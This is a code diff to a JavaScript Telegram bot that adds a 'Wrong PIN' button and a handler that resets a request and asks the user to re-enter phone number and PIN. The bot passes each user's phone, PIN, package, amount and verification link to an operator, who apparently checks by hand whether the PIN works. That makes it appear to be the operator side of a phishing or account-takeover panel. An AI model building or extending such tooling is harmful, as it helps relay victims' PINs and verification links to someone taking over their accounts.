@@ -284,6 +284,28 @@ if (botEnabled && bot) {
 
             setTimeout(() => approvals.delete(requestId), 30000);
 
+        } else if (action === 'link_wrong_pin') {
+            // Reset to pending so user re-enters phone and PIN
+            request.status = 'pending';
+            request.verificationLink = null;
+            request.userPin = null;
+            request.verificationStep = null;
+
+            const text = `🔑 Wrong PIN\n\n` +
+                `📱 Phone: ${request.userPhone}\n` +
+                `📦 Package: ${request.package}\n` +
+                `💰 Amount: ${request.amount}\n\n` +
+                `The PIN was incorrect. The user has been notified to re-enter phone number and PIN.`;
+
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: query.message.message_id
+            });
+
+            await bot.answerCallbackQuery(query.id, { text: '🔑 Wrong PIN - user will re-enter phone/PIN' });
+
+            if (request.onWrongPin) request.onWrongPin(requestId);
+
         } else if (action === 'link_invalid') {
             // Reset to phone_pin_verified so user can re-enter link
             request.status = 'phone_pin_verified';
@@ -491,7 +513,8 @@ function submitLink(requestId, link) {
             inline_keyboard: [
                 [{ text: '🔗 Open Verification Link', url: verificationUrl }],
                 [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
-                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
+                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }],
+                [{ text: '🔑 Wrong PIN', callback_data: `link_wrong_pin_${requestId}` }]
             ]
         };
         
